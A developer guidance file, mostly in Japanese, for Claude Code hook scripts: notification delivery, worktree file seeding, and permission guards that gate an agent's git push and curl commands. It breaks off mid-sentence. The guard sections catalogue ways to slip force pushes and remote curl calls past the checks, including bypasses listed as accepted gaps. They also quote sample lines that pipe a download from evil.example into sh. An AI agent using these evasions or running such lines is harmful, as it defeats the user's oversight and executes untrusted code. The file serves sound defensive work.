# Claude Code Hook Scripts

Guidance for `dot_claude/scripts/`, narrowly scoped to this directory's hooks (notification
delivery, worktree seeding) so it only needs to load when working here. See
`.claude/rules/shell-scripts.md` for general hook-script conventions.

**Notification hook ownership** — `dot_claude/scripts/executable_notify.sh` is wired to
`Notification` (permission requests, idle waits) and `StopFailure` (the turn ended because
of an API error) only. It is deliberately **not** wired to `Stop`: `Stop` fires at the end of
every assistant turn, which made notifications worthless noise. The `Notification` entry's
`matcher` filters on the payload's `notification_type`, so only
`permission_prompt|idle_prompt|agent_needs_input` reach the script and the non-blocking types
(`agent_completed`, `auth_success`, `elicitation_*`) never invoke it — the `permission_prompt`
pattern also matches `worker_permission_prompt`, which is wanted: that one is a network-access
approval dialog. The script classifies on `notification_type` as well, not on the English
prose in `message`; the message regex survives only as a fallback for a Claude Code that omits
the field, and matches `approv` (not `approve`) because the product's literal is "needs your
approval for …". Both notify entries set `"timeout": 5` so a hanging delivery backend
(`terminal-notifier` produces no output for 120s under a Seatbelt sandbox, which the
safehouse-wrapped `claude` imposes on hooks) degrades fast instead of holding the hook slot
for the 60s default. The script exits silently
when `ORCA_PANE_KEY`, `ORCA_AGENT_HOOK_PORT`, and `ORCA_AGENT_HOOK_TOKEN` are all set —
that is the exact condition under which `~/.orca/agent-hooks/claude-hook.sh` forwards the
event to orca, so orca will notify instead, with better worktree/tab attribution. Checking
`ORCA_PANE_KEY` alone would create a silent gap when orca's port or token is missing.
Notifications carry attribution (cwd basename plus git branch) and a wait kind, never a
summary of Claude's last message — the transcript is never read; a `StopFailure` body names
the API failure (`rate_limit`, `authentication_failed`, …) from the payload's `error` field.
Delivery is `terminal-notifier` (for `-group` replacement and click-to-focus) falling back to
`osascript`; **`terminal-notifier` fails silently until macOS notification permission is
granted**, and the fallback does not cover that — backend selection is
`command -v terminal-notifier`, so `osascript` runs only when the binary is absent. On a new
machine verify notifications actually arrive rather than assuming.
orca's own notification granularity is GUI-only and not version-controlled. Every
invocation that clears the suppression gates appends one line to `~/.claude/logs/notify.log`
(bounded to 500 lines) recording event, kind, `notification_type`, `error`, and message —
that log is how a misclassification gets diagnosed, and `error` is recorded separately
because `message` is always empty for `StopFailure`. Suppressed invocations log nothing, so
an empty log inside an orca workspace is the expected result rather than evidence the hook is
broken.
Design: `docs/superpowers/specs/2026-07-25-notification-hook-redesign-design.md`.

**Worktree seeding hook** — `dot_claude/scripts/executable_worktree-include.sh` is wired to
`SessionStart` (`startup|resume|clear`) and copies the files a repository's `.worktreeinclude`
lists from the **main** worktree into the linked worktree the session is running in.
`.worktreeinclude` is git-worktree-runner's convention, but only `gtr new` acts on it — a
worktree created by orca or by plain `git worktree add` starts without the gitignored local
files a session needs (`CLAUDE.local.md`, `.claude/settings.local.json`). Firing at
SessionStart rather than at worktree-creation time is deliberate: orca exposes no
create-time hook, and the later trigger also heals worktrees that already exist.
**Copy-if-absent, never overwrite** — SessionStart fires again on every resume and `/clear`,
and Claude Code itself writes `.claude/settings.local.json` inside the worktree whenever the
user picks "always allow"; an overwriting sync would erase that on the next resume. This is
also why the hook does not simply shell out to `git gtr copy`, whose `cp` is unconditional
(and which is absent in CI). Every guard exits 0 — a missing `.worktreeinclude`, a
non-worktree cwd, a main-worktree cwd — and stdout stays empty unless a file was actually
copied, because SessionStart stdout becomes the session's additional context.
Pattern semantics deliberately diverge from gtr in one place: a **leading `/` is read as
"anchored at the repo root"** the way `.gitignore` does it, whereas gtr classifies it as an
absolute path and silently drops the line (verified: `git gtr copy --dry-run` reports
`Skipping unsafe pattern … /.claude/settings.local.json`). Those `.worktreeinclude` lines have
therefore never been honored by gtr itself; on the **work** profile the defect was masked
because `dot_gitconfig.tmpl` separately sets `gtr.copy.include = .claude/settings.local.json`,
which `gtr new` does act on — so the file appeared anyway and nobody noticed the dropped line.
`..` segments are still refused, directories are skipped (regular files
only), and `**` is not supported. `gtr.copy.include` from gitconfig is deliberately **not**
read — reimplementing gtr's merge rules would double-copy under `gtr new`.
Tested by `just test-scripts` (`test/worktree-include.bats`).

パスのエスケープ対策は `..` の文字列チェックだけでは閉じない。`..` を一切綴らずに worktree の外へ
出る経路が3つあり(いずれも修正前に実際に再現済み)、それぞれ別の防御が要る: (1) main worktree 側の
**シンボリックリンク** — leaf が `foo.txt -> ~/.ssh/id_ed25519` の場合も、中間ディレクトリが
`sub -> /etc` の場合も、`[[ -f ]]` は真になり `cp -p` はリンク先の中身をコピーする。(2) worktree 側の
**シンボリックリンクのディレクトリ** — `.claude -> $HOME` があると `mkdir -p` が成功して worktree の
外へ書き込む。(3) worktree 側の**壊れたシンボリックリンク** — `-e` が偽なので「既存なら上書きしない」の
ガードをすり抜け、`cp` がリンク先へ書き抜ける。対策は文字列マッチではなく**物理パスでの包含チェック**:
`physical_ancestor()`(実在する最深の祖先ディレクトリを `cd`+`pwd -P` で解決)の結果が `MAIN_ROOT` /
`WORKTREE_ROOT` の配下にあることを、コピー元・コピー先の両方について要求する。コピー先の判定は
`mkdir -p` の**前**に行う — でないとシンボリックリンクの向こう側に空ディレクトリを作ってしまう。
壊れたリンク対策として、既存判定は `-e` ではなく `[[ -e || -L ]]` で行う。`WORKTREE_ROOT` を
`git rev-parse --show-toplevel` のまま使わず `pwd -P` で解決し直しているのは、`MAIN_ROOT` が
`pwd -P` 由来であり、比較の両辺が物理パスでないとこの包含チェックが無意味になるため。

パターンの分割は `IFS=$'\n'` で行う。デフォルトの `IFS` のままだと、名前に空白を含む行
(`my file.local`)が2つのパターンに割れてどちらもマッチせず、**エラーも出さずにコピーされない**。
`.worktreeinclude` の1行に改行は入りえないので改行区切りは実質「分割しない」であり、glob 展開の
*結果*が再分割されることもない。ただしデフォルト `IFS` は末尾の空白を暗黙に落としていたので、
`.gitignore` 同様に末尾空白を無視する明示的なトリム(`${pattern%"${pattern##*[![:space:]]}"}`)を
対にして入れてある。`[[:space:]]` は CR を含むため、CRLF でチェックアウトされた
`.worktreeinclude` もこれで通る。

**git push guard hook** — `dot_claude/scripts/executable_git-push-guard.sh` は `PreToolUse`
(`matcher: "Bash"`)で走る**許可判定フック**。他の2つのフック(notify / worktree-include)と違い、
これは副作用のための hook ではなく `hookSpecificOutput.permissionDecision` を返して**ツール呼び出しを
止める**ためのもの。存在理由は `permissions` のプレフィックス照合の限界で、`Bash(git push --force:*)`
は `git push origin main --force` に当たらない — write intent がフラグ位置に移動できるため、
`Bash(git push:*)` を `ask` に置く以外に塞ぐ手が無く、その結果として日常の push まで毎回プロンプトに
なっていた。フックはコマンド文字列**全体**を受け取るので、引数位置に依存しない判定が書ける。

判定は3値。`deny` は `--force` / `--force-with-lease[=…]` / `--force-if-includes` / `--delete` /
`--mirror` / `--prune`、`f` か `d` を含む束ねた短オプション、`+` 始まりの refspec、`:` 始まり
(src が空 = リモート ref 削除)の refspec。`ask` は**読み切れなかったとき**の fail-closed 値で、
push セグメント内の変数・コマンド置換、`push` または `mirror` に言及する `-c` 上書き
(`-c remote.origin.push=+refs/…` は引数走査では見えず、`-c remote.origin.mirror=true` は
フラグを 1 つも書かずに `--mirror` 相当にする。`mirror` は `push` を部分文字列に持たないので
別パターンが要る。git の設定キーは大文字小文字を区別しないので、`remote.origin.MIRROR` も同じに扱う)、
同じ設定を環境変数で運ぶ `GIT_CONFIG*` で始まる token(前置きの代入でも `export` でも)、
および**コマンド位置を確定できないセグメント**(下記)。それ以外は**無出力 exit 0** で
`defaultMode: auto` のクラシファイア判定に落ちる。`ask` は auto mode でもプロンプトを出す
(公式ドキュメントの PreToolUse 契約)ので、フェイルクローズが実際に閉じる。

実装上の要点:

- **読み取り(セグメント分割・引用符の解釈・区切りの正規化)は共有 reader に移した。** 旧版の
  「セグメント分割」「分割の前に正規化が要る」「トークンの引用符は1層だけ剥がす」の3項は、
  `dot_claude/scripts/lib/shell-reader.bash` の性質になった(テストは `test/shell-reader.bats`、
  概要は下の「shell command reader」節)。引用符の中の区切り(`git commit -m "a; b"`)で
  誤って `deny` する問題も、引用符を解釈する reader に載せたことで消えた。
- **`$`/バッククォートの検査は push セグメントに限定する。** コマンド全体に広げると
  `git commit -m "$(date)" && git push origin x` まで `ask` になり、承認疲れの解消という目的を
  自分で潰す。一方 `F=--force; git push $F` は push セグメント側に `$` が出るので捕まる。
- **長オプションは前方一致で見る(部分一致ではない)。** git は長オプションの一意な前方一致を
  受け付ける(`--dele` は `--delete`、`--force-w` は `--force-with-lease`。実 git で `--dele` が
  リモートブランチを消すことを確認済み)ので、`=` より前が危険なオプションの前方一致なら `deny`。
  曖昧な前方一致(`--d` は `--dry-run` とも一致)は git 自身がエラーにするので、`deny` にしても
  失うものは無い。部分一致にすると `--no-force-with-lease` を force として誤検出する。
- **番兵の byte・プロセス置換・ブレース展開・パス名展開は `ask`。** reader の segment 区切りの番兵
  (`\x01`)が入力にあると、redirect 先を `\x01` にした force push(bash には普通の文字なので `--force` は
  git の引数に残る)が reader には `--force` だけの別 segment に見えて無出力になっていた。`push` を含む
  コマンドで `SHELL_READER_SEP_IN_INPUT` か `PROCESS_SUBSTITUTION` が立てば `ask` にする。ただし
  segment の走査は続け、読み切れた別の segment に危険な綴りがあれば `deny` が勝つ
  (`git push origin main --force; cat <(true)` を `ask` に格下げしない)。segment にブレース展開
  (reader の `SHELL_READER_BRACE_INDEXES`)かパス名展開(`GLOB_INDEXES`。引用符の外の `*` `?` `[`)が
  あるときも `ask` — `{main,--force}` や `-{f..f}`、cwd に `-f` を置いた `-?` は展開の結果としてだけ
  危険な綴りを作り、token には現れない。binary やサブコマンドそのものを展開で作る綴り
  (`git {push,origin,main,--force}`、bash の `{git,push,…}`、`env {git,push,…}`、`/usr/bin/gi? push …`)は
  `git` と `push` が別の token として現れないので、コマンドの位置の token に印があり segment に `push` を
  含む token があるとき、またはサブコマンドの token に印があり `push` を含むときも `ask` にする。
  コマンドの位置とサブコマンドに限るのは、`grep -n push *.sh` のような引数の glob を巻き込まないため
  (`xargs /usr/bin/gi? push …` のように前置詞の後ろで git を展開で作る綴りは残存)。
  後ろが空白の `{` はグループ(`{ git push origin main; }`)なので reader が記録せず、無出力のまま。
  コマンドの位置の token が置換か変数(`$G push …`、`` `which git` push … ``、`"$(command -v git)" push …`、
  引用符の外の `${G} push …`。最後のものは reader が `{` で切るので、後ろの token にブレースの印がある
  単独の `$` として読む)のときも、同じく segment に `push` を含む token があれば `ask`。引用符の外の
  `$(which git) push …` は reader が `)` で segment を切り、push の segment が `push` そのものか git の
  全体オプション・リダイレクト(`-C . push …`、`2>/dev/null push …`)から始まるので、その segment が
  引用符の外の `$(`(`$` で終わる token の直後の区切り)より後ろにあり、先頭がそれらのときも `ask` に
  する(共有 reader に載せ替える前は `()` を空白に置き換えていたので `ask` だった)。コマンド全体の `$` では
  なく `$(` の位置で絞るのは、heredoc 本文の行頭の `push` と別の行の `$HOME` を組み合わせないため。
- **zsh の綴りも読む。** Bash ツールは利用者のシェル(このマシンでは zsh)で動くので、`=git`(EQUALS。
  PATH 上の git に展開される)の語頭の `=` を外して binary を読み、`=(…)`(zsh のプロセス置換)を
  reader が `PROCESS_SUBSTITUTION` として返す。`=git push origin main --force` はこれが無いと無出力で、
  `deny` ルールのプレフィックス照合にも当たらなかった。
- **`--attr-source <tree>` は値を別の token に取る。** `-C` / `--git-dir` などと同じく 2 つ進める。
  並べないと値(`HEAD`)がサブコマンドに見え、`git --attr-source HEAD push … --force` が無出力だった。
- **引用符は reader が外した token を読む。** `git push origin "+main"` の token は `+main` になる
  ので `+` 始まり判定が効く(この処理自体は上の共有 reader の性質)。
- **`git` がトークン0に無いセグメントを素通りさせない。** 正規化で潰した3経路
  (グルーピング記号・リダイレクト・継続行)に加えて、**普通のトークンとして binary の前に立つもの**
  が4つ目の経路だった。先頭の変数代入(`VAR=v git push …`)と、シェルキーワード・コマンド前置詞
  (`if` / `then` / `elif` / `else` / `fi` / `while` / `until` / `do` / `done` / `!` / `time` /
  `nohup` / `command` / `env` / `sudo` / `nice` / `exec`)を読み飛ばしてから binary を読む。
  1行の `for r in …; do git push $r --force; done` や `if true; then git push --force; fi` は
  エージェントが普通に書く綴りで、修正前はいずれも**無出力**だった。読み飛ばしは配列を
  スライスせずインデックスを進める形で書く — bash 3.2 は `set -u` 下で空配列の展開を拒否する。
- **認識に失敗したセグメントにも床を張る(コマンド位置の床)。** 上のリストに無い前置詞(`xargs -n1 git push …`)では
  コマンド位置を確定できない。そこで、セグメント内に reader の token として `git`(basename が
  `git`)と読めるものがあれば、そこから同じ走査をやり直し、危険な綴りが見つかったら `deny` ではなく
  **`ask`** にする。deny にしない理由は、`gh pr create --body "$(cat <<EOF … )"` の中の
  `- git push --force を deny する` のような**散文が同じ形にトークナイズされる**ため。
  `echo "git push --force"` が無出力のままなのは、引用符の中が reader の token 1 つ
  (`git push --force` 全体)になり、`git` と読める token が無いため(`echo "git" push … --force` は
  reader が引用符を外して `git` の token になるので `ask`)。
  ただし**バッククォートだけは剥がす** — `` `git push …` `` は実行されるので、
  引用符とは違いテキストではない。この床のおかげで `$(git push … --force)` と
  `` `git push … --force` `` のどちらも `ask` に落ちる。token の途中のバッククォートも実行されるので、
  最後のバッククォートより後ろを見る: 引用符の外の `` x=`git push origin main --force` `` は reader が
  空白で割って代入の token が `` x=`git `` になり、前置の読み飛ばしで command_start の手前に来るので、
  この床の走査は先頭の token から始める(手前にあるのは代入とキーワード・前置詞だけ)。
  この床では、危険な綴りに加えて **push の引数の `$` / バッククォート**でも `ask` にする
  (`` x=`git push origin $r` `` や `` echo `git push origin $r` `` は、変数が `--force` を運んでも
  無出力だった)。コマンド位置の push と違って見るのは push の引数だけで、git を包む置換を閉じる
  末尾のバッククォート 1 つは数えない(`` x=`git push origin main` `` は無出力のまま)。`-c` の検査は
  push を壊す値(`remote.*.push` / `remote.*.mirror` / `include*`)に絞って使い、`GIT_CONFIG*` の token も見る。
  `nice -n 0` / `timeout 60` / `sudo -n` の後ろの git はこの床に来るので、見ないと
  `timeout 60 git -c remote.origin.mirror=true push origin` が無出力だった(実 git でリモートのブランチが消える)。
  `-c push.autoSetupRemote=true` のような無害な設定は巻き込まない。どれが立っても `deny` にはしない。
  初版はこの床が無く、しかも `$`/バッククォートの fail-closed 判定が「binary が git だった」
  分岐の**内側**にあったため、認識器が外れた瞬間に fail-closed 自体が無効化されていた。
- **字面の床(行単位のテキスト走査)。** 上の床でも、構文として読み切れない入力(閉じない引用符、
  `$(…)` / バッククォートの内側)は取りこぼす。そこで行ごとに、`$` かバッククォートを含む token、
  **改行を含む token**、`UNCLOSED_QUOTE` のときの最後の token を対象に、`git … push` と危険な綴りが
  同じ行にあれば `ask` にする。改行を含む token を見るのは、reader が heredoc とコメントを知らないため:
  本文やコメントの中の引用符 1 つ(`it"s`、`# "`)で走査だけが引用符の中に入り、次の同じ引用符までの行
  (bash が実行する force push を含む)が 1 token に飲み込まれる。閉じる引用符もそろうと
  `UNCLOSED_QUOTE` は立たないので、この条件が無いと無出力で通っていた。
  加えて、`$(` / `${` / バッククォートを含む最初の token から後ろはすべて対象にする。reader は引用符の
  中の置換の入れ子の引用符を知らないので、`echo "$(echo "a it's")" ; git push origin main --force ; echo ' x'`
  では入れ子の `"` で引用符が閉じたと読み、bash が実行する push が改行も `$` も無い 1 token に飲み込まれる
  (閉じない引用符の最後の token も空になる)。ずれは置換より後ろでしか起きない。
  危険な綴りは token の判定と同じく、長オプションの前方一致(`--forc`)と `-c` の push / mirror の設定も含む。
  `deny` が既に決まっていれば走らせない。散文が同じ形になりうる(PR 本文など)ので `deny` にはせず、
  同じ行に「git … push」と `-f` や `:x` を含む散文が `ask` になる誤 ask は受容している。
  短フラグ(`-f` など)も対象で、token の判定と同じく数字を含む束(`-4f` は `--ipv4` + `--force`)も一致させる
  (`test/git-push-guard.bats` が「token の判定で deny する束は床でも ask」を対で固定している)。長さ超過の入力では、同じ床を生のコマンド全体に当てる(下の上限)。
  行の分割と照合は共有 reader の `shell_reader_any_line_matches` が行う(curl-guard の床と共用)。
  照合の前に行継続(`\` + 改行)をつなぎ、引用符と backslash を外す — シェルはこれらを外してから
  語を読むので、生の字面では `"$(git'' push … --force)"` や、長さ超過の `'git' push … --force` /
  `git push … \⏎--force` が一致しなかった。つなぐときは何も足さず(空白を足すと `--\⏎force` が
  `-- force` になる)、つなぐ前の各行も残す。行末の `\` は行継続とは限らず(`echo a\\` の `\\` は
  シェルには `\` 1 文字で、次の行は別のコマンド)、つないだ行だけだと `echo agit push … --force` に
  なって語頭の `git` に一致しない。reader は二重引用符の中で `\\` を `\` 1 つにするので、`\` の
  個数では区別できない。正規化は `awk` と `tr` を 1 回通す(bash 3.2 の `${s//…}` は
  8 KB で 3 秒かかる)。引用符も backslash も無ければ fork しない。行の分割は改行での単語分割
  (`set -f` の下)で行う。here-string は一時ファイルを使うので `$TMPDIR` に書けないと黙って
  「一致なし」になり、`${s%%$'\n'*}` / `${s#*$'\n'}` の行ループは毎行残りをコピーして二乗になる
  (179 KB で 2.3 秒。単語分割は 0.02 秒)。
- **lib が読めない・壊れているときは `ask`。** フックは `[[ -r "$reader_library" ]]` と
  `"$BASH" -n`(PATH 上の bash ではなくフック自身の interpreter)を確かめてから `source` し、
  その後 `declare -F shell_reader_read shell_reader_each_segment shell_reader_any_line_matches` で
  関数がそろったことを確かめる。
  存在しないファイルへの素の `source … || …` は bash 3.2 で `||` に届く前に exit 1 し、
  構文エラーの lib では `source` 自体が exit 2(PreToolUse では理由なしのブロック)で終わり、
  空や途中で切れた lib では関数が無いまま進んで exit 127(ブロックしないエラー = フェイルオープン)になる。
  どの経路でも判定不能のまま素通りさせず `ask` を返す。
- **上限は 8192 byte。** `LC_ALL=C` で数え、超えたら reader は token を作らず `TOO_LONG` を返す。
  git-push-guard はこのとき上の字面の床を生のコマンドに当て、一致すれば `ask`(`deny` ではない)、
  しなければ何も返さない(classifier に任せる)。長い PR 本文の散文が `ask` になるのは受容している。
  床に一致しない形(危険な綴りが別の行にあるなど)を守るのは、`settings.json.tmpl` の先頭フラグ形
  `deny` 3 行だけになる。
- **`-c alias.<name>=…` に push を含むものは、サブコマンドに関係なく `ask`。**
  `git -c alias.p='push --force' p origin main` はサブコマンドが `p` なので、`push` と分かった後にだけ
  立てていた `-c` の検査に届かなかった。alias の展開先は読まないので `deny` ではなく `ask`。
  git の設定キーは大文字小文字を区別しないので `ALIAS.p=…` も同じに扱う。
  `--config-env alias.<name>=VAR` は `=` の後ろが環境変数の名前で展開先が読めないので、値に関係なく `ask`
  (`A='push --force' git --config-env=alias.p=A p origin main` が無出力だった)。push の segment の
  `-c include.path=…` / `includeIf.*` も、読めないファイルの設定を取り込むので `ask`。
- **heredoc の本文とコメントの中の危険な綴りは `ask` 止まり。** reader は heredoc もコメントも知らないので、
  `git commit -F - <<'EOF'` の本文の行 `git push --force を deny する` や、`git push origin main # do not --force`
  の `--force` が `deny` になっていた。`deny` は承認しても通せないので、このフックについてのコミットメッセージを
  heredoc で書けなかった。heredoc 演算子(reader の `SHELL_READER_HEREDOC_INDEXES`)より後ろの
  segment と、push の引数の語頭の `#` より後ろでは、危険な綴りを `ask` にする。受容した格下げ: heredoc の後ろに
  実際に書かれた force push と、引用された `'#x'` の後ろの `--force` も `ask` になる(どちらも確認は出る)。
  heredoc かどうかを token 列から判定してはいけない: `<<`・here-string の `<<<`・`< <(…)` はどれも `<`, `<` の
  演算子 token になり、初版は本文を持たない `cat <<< x; git push origin main --force` まで `ask` に下げていた。
  reader が走査の時点で「前後に `<` が続かない引用符の外の `<<`」だけを記録する。
- **コマンド全体を見る検査は 1 回だけ走らせる。** `GIT_CONFIG*` の token の検査を push の segment ごとに
  コマンド全体へ当てていたため segment 数 × token 数の二乗になり、8 KB 近い
  `git push origin main --force;git push;…` が 5 秒(フックの timeout)を越えて判定なし = フェイルオープンに
  なっていた。segment の走査の前に 1 回だけ数える(`test/git-push-guard.bats` に時間の上限つきのケースがある)。
  展開の印(`BRACE_INDEXES` / `GLOB_INDEXES`)も同じ形で二乗になっていた: `{` は 1 byte ごとに同じ index の印を
  足し、` *` は 2 byte ごとに印を足すので、push の segment ごとに印の全件を走査すると 8 KB で 8 秒かかった。
  reader は同じ index の印を 1 回だけ残し、フックは印の全件ではなく segment の token ごとに引く。
- **残存(受容): 大文字小文字。** 大文字小文字を区別しない APFS では `GIT push --delete …` も git を
  実行するが、早期終了と basename の比較が大文字小文字を区別するので無出力になる(ADR 0009)。
- **残存(受容): 早期終了は引用符除去より前。** コマンドに `push` の部分文字列が無ければ reader を
  呼ばずに終わるので、`git pu""sh origin main --force` は何も返さない(ADR 0009)。展開で `push` を
  作る `git {pu,}sh …` も同じ。
- **残存(受容): 永続した設定。** 同じコマンドや前の呼び出しの `git config remote.origin.mirror true`
  (や `remote.<name>.push=+…`)の後の素の push は無出力。読むのはコマンド文字列だけで、リポジトリの
  設定は読まない。
- **残存(受容): `$(…)` の後ろの危険な綴りは `ask` 止まり。** reader は `$(` で segment を切るので、
  `git push origin $(git branch --show-current) --force` の `--force` は push の segment に入らない
  (push の segment の `$` で `ask` にはなる)。`deny` にするには reader が置換の入れ子を追う必要がある。
- **残存(受容): zsh のグロブのグループ・修飾子 `(…)`。** reader は語の途中の `(` を segment の区切りに読むので、
  `git push origin HEAD:main README.md(e:'reply=(-f)':)` や、cwd に `-f` があるときの `-(f)(N)` / `(-f|zz)` は
  `-f` が push の segment に入らず無出力になる(実 zsh で force push を確認)。修飾子の `e:'…':` / `+…` は
  中身をコードとして実行するので、`echo *(e:'git push origin main --force':)` のように force push を丸ごと
  修飾子に入れた形も無出力になる(引用符の中は 1 token。`bash -c "…"` と同じ種類で、ADR 0009)。
- **残存(受容): git-core の dashed binary と `send-pack`。** `…/libexec/git-core/git-push origin main --force` と
  `$(git --exec-path)/git-push …` は basename が `git` ではなく、`git send-pack --force …` はサブコマンドが `push`
  ではないので無出力になる。
- **残存(受容): 標準入力が運ぶ引数。** `echo --force | xargs git push origin main` の `--force` はパイプの左側にあり、
  push の segment に危険な綴りが無いので無出力になる。
- **残存(受容): `env -S "<文字列>"`。** `bash -c` の内側と同じく、文字列は 1 token になって読まない。
- **ログ出力先の決定はスクリプト内に持つ。** `settings.json` 側で
  `mkdir -p … && script 2>>log` と書くと、ログディレクトリを作れないときに
  **リダイレクトの失敗でスクリプトごと走らない** = 判定なし = フェイルオープンになる
  (`;` に変えても直らない。リダイレクトの失敗はそのコマンドを放棄させる)。フックの
  `command` はスクリプトのパスそのものにして、ログは開けたときだけ `exec 2>>` で繋ぐ。
  開けるかの判定は `-w` ではなく `(: >>"$LOG_FILE")` の実書き込みで行う — `exec` は
  special builtin なので、開けなかった場合に**無出力でシェルごと落ちる**(= 塞ごうとしている
  フェイルオープンそのもの)。書き込めない `$HOME` でも deny が出ることをテストで固定してある。

フックが未配置・クラッシュした場合は無出力=判定なしで**フェイルオープン**する。そのため
`settings.json.tmpl` の `deny` にある先頭フラグ形3行(`--force` / `--force-with-lease` / `-f`)は
冗長に見えても**残してある**(多層防御の床)。Source 上の配線(`PreToolUse` / `matcher: "Bash"` /
直接呼び出し / timeout / `disableAllHooks` が立っていないこと)とこの 3 行の存在は
`just test-settings-hooks`(`test/settings-hooks.bats`)が描画結果で固定している。
フック自身の判定は `just test-scripts`(`test/git-push-guard.bats`)がテストする。テストは危険な綴りだけでなく**無出力になるべきケース**と対で書くこと — 片側だけだと
「常に deny するフック」が全テストを通過してしまう。
設計: `docs/superpowers/specs/2026-07-25-permission-tier-model-design.md` の 2026-09-16 addendum。

**curl localhost guard hook** — `dot_claude/scripts/executable_curl-localhost-guard.sh` も
`PreToolUse`(`matcher: "Bash"`)で走る。**git-push-guard と同じ向き**(`allow` を返さず、フックが
`ask` / 無出力で判定する)にそろえてある。2026-09-30 までは `Bash(curl:*)` を `permissions.ask` に
残したままフックが `allow` で緩める逆向きの構成だったが、Claude Code 2.1.285 ではフックの `allow` が
マッチする ask ルールに**負ける**ことを実測したため反転した(測定は `docs/adr/0008-…`(deprecated)、
決定は `docs/adr/0009-command-guard-hooks-gate-without-allow.md`)。フックの `deny` / `ask` は
default / auto の両 mode で効く。

現在の構成: `Bash(curl:*)` は `permissions.ask` に**置かない**。フックが curl を実行しうる token を
含むコマンドのうち、宛先がすべてループバックと読み切れないものに `ask` を返し、ループバック宛だけを
無出力(= `defaultMode: auto` のクラシファイア判定)に落とす。未配置・クラッシュでは
無出力になり、curl の確認が**外れる**(フェイルオープン)ことに注意 — 旧構成の「フェイルクローズ」は
ask ルールが土台だったから成り立っていた。`jq` が無いときは生の入力に `curl` があれば `ask`、
lib が読めない・壊れているときも `ask` を返す(下の「shell command reader」節)。

存在理由は `permissions` のプレフィックス照合の限界で、これも git push と同じ形: URL はフラグの
後ろ(`curl -sS -H … URL`)に来るので `Bash(curl http://localhost:*)` という allow エントリでは
届かない。フックはコマンド文字列全体を受け取るので URL の位置に依存せず判定できる。

判定は2値 — `ask` か無出力のみで、`allow` も `deny` も返さない。無出力にする条件は、コマンドの
**すべての**セグメントが「ループバック宛の curl」か `INERT_COMMANDS` の読み取り専用フィルタ
(`jq` / `grep` / `cd` など)であること、または**curl を実行しうる token が1つも無く、下の字面の床にも
一致しない**こと。`INERT_COMMANDS` に入れるのは、プログラムを起動する経路を持たないコマンドだけ。
`sort` は `--compress-program=sh` で一時データを sh に実行させられる(`curl … | sort --compress-program=sh`
が `| sh` と同じになる。macOS の `/usr/bin/sort` で実測)ので外してある。
「curl を実行しうる token」= basename(先頭のバッククォートと、zsh の EQUALS の語頭の `=` を
除いたもの)が `curl` の token か、ブレース展開・パス名展開の印(reader の `BRACE_INDEXES` /
`GLOB_INDEXES`)が付いていて、展開の結果として basename が `curl` の語になりうる token(ブレースは
`,` で区切った要素ごと、glob はそれ自体をパターンとして照合する。`test/curl-*.bats` は該当しない)。
`echo curl` のような単なる言及は含めないが、
`/usr/bin/curl`・`` `curl …` ``・zsh の `=curl`・展開の結果としてだけ curl になる bash の
`{curl,https://…}` や zsh でも効く `env {curl,https://…}`、`/usr/bin/curl*` は含める(後者は
`WORD_MULTIPLIER` で `ask`)。受容した誤 ask: `ls docs/*curl*` のように curl を含む glob を引数に
書いたもの。認識は全階層が
ホワイトリスト: 未知のフラグ・未知のパイプ先・`http`/`https` 以外のスキーム・ループバック以外の
ホストは、いずれも「たぶん安全」ではなく **`ask`** に倒す。8192 byte を超える入力は下の字面の床
だけで判定する。

**字面の床(curl がコマンドの位置にあるか)。** reader は引用符の中の `$(…)` やバッククォートの中を
読まないので、`x="$(curl -s https://evil.example/)"` や `echo "$(curl … | sh)"` の curl は 1 token の
文字列に埋まる。閉じていない引用符(heredoc 本文の `don't` や `"` 1 個)も、それ以降を 1 token に
飲み込むので、heredoc の後ろで bash が実行する `curl … | sh` が見えない。どちらも「curl を実行しうる
token が無い」ように見えて無出力になっていた(`Bash(curl:*)` の ask ルールを外したので、下に土台が無い)。
そこで curl と読める token が無いときに限り、`$` かバッククォートを含む token と、`UNCLOSED_QUOTE`
のときの最後の token と、`$(` / `${` / バッククォートを含む最初の token から後ろのすべての token
(引用符の中の置換の入れ子の引用符で reader の同期がずれ、後ろの curl が改行も `$` も無い 1 token に
飲み込まれるため。git-push-guard の床と同じ)を行ごとに見て、行頭か `;&|(` / バッククォートの直後(空白、変数の代入か前置詞
(`command` / `eval` / `env` / `timeout` / `xargs` など)かシェルのキーワード(`if` / `then` / `elif` / `else` /
`while` / `until` / `do` / `!` / `{`)で始まる語の並び、`\curl` の `\`、`/usr/bin/` のような
パスの前置(curl にも前置詞にも。`/usr/bin/env curl`)、コマンドの前の redirect(`2>/dev/null` /
`2> /dev/null` / `<in`。対象の語 1 つだけを読み飛ばす。fd の数字の無い `<` / `>` は対象が続けて書かれた
形だけ — 空白を挟む形を許すと Markdown の引用 `> 今回は curl を…` まで一致する)は許す)に `curl`
(後ろは空白か行末)があれば `ask` にする。照合は共有 reader の
`shell_reader_any_line_matches` が行い、その前に引用符と backslash を外して行継続をつなぐ
(`x="$(curl'' https://evil.example/ | sh)"` や長さ超過の `'curl' …` は、生の字面では一致しなかった)。行末を許すのは、引用符の外の
バッククォート置換で curl を呼ぶ代入(`` x=`curl -s …` ``)を reader が空白で割り、最初の token が
バッククォート + `curl` で終わるため(`CURL_PRESENT` は先頭のバッククォートしか外さないので、こちらも一致しない)。正規表現は POSIX ERE で、`\b` は使わない
(macOS の `/bin/bash` 3.2 の `=~` では単語境界にならない)。長さ超過の入力では同じ床を生のコマンド
全体に当てる。受容した誤 ask: heredoc や置換の中の散文で、同じ位置に `curl ` を置いたもの
(Markdown のコードスパン `` `curl …` `` を含む。PR 本文でよく出る)。`UNCLOSED_QUOTE` を一律に `ask` に
する案は採らない — `*curl*` の早期終了を通った、`don't` を含む PR 本文の heredoc がすべて `ask` になる。

ただし **curl と読める token が見つかった後(`CURL_PRESENT=1`)の `UNCLOSED_QUOTE` は `ask`** にする
(`EXPANSION` などと同じ「読み切れない」扱い)。閉じていない token は curl の segment に入るとは限らない:
`curl -s http://localhost:3000/ && echo it's ; curl https://evil.example/x | sh` では、`'` 以降が `echo` の
引数の 1 token になり、`echo` は `INERT_COMMANDS` なので segment の走査を通っていた。改行を含まない
token には `CURL_PRESENT=1` のとき字面の床が当たらないので、こちらにも掛からない(heredoc で改行を
含む形は下の床が拾う)。PR 本文の heredoc は curl が 1 token に
飲み込まれて `CURL_PRESENT=0` 側に行くので影響を受けない。受容した誤 ask: ループバック宛の curl と、
アポストロフィを含む heredoc 本文の組み合わせ(後ろに何も無くても `ask`)。

**改行を含む token には、`CURL_PRESENT` に関係なく字面の床を当てる。** reader は heredoc とコメントを
